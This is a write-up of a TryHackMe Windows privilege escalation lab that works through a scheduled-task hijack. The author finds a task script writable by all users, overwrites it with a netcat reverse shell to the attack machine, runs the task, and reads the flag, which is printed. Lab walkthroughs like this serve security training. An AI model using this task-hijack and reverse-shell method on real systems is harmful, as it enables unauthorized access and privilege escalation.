# About This Module
Module link: https://tryhackme.com/room/windowsprivesc20

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/10/2023

# Schedule Tasks
1. Started this task's machine
2. `schtasks /query /tn <TASK NAME> /fo list /v` from the compromised Windows machine
```PowerShell
C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/10/2023 2:58:01 PM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```
3. `icacls <BINARY FILE PATH>` from the compromised Windows machine
```PowerShell
C:\Users\thm-unpriv>icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```
4. `echo <NETCAT EXECUTABLE PATH> -e cmd.exe <ATTACK MACHINE IP> <PORT NUMBER> > <BINARY FILE PATH>`
```PowerShell
C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe 10.10.54.202 9999 > C:\tasks\schtask.bat
```
5. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
```Bash
root@ip-10-10-54-202:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
6. `schtasks /run /tn <TASK NAME>` from the compromised Windows machine
```PowerShell
C:\Users\thm-unpriv>schtasks /run /tn vulntask
SUCCESS: Attempted to run the scheduled task "vulntask".
```
```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.71.161 49727 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
7. `type <USER TEXT FLAG PATH>` from our reverse shell on our attack machine
```PowerShell
C:\Windows\system32>type C:\Users\taskusr1\Desktop\flag.txt
type C:\Users\taskusr1\Desktop\flag.txt
THM{TASK_COMPLETED}
```


**TASK COMPLETED!**
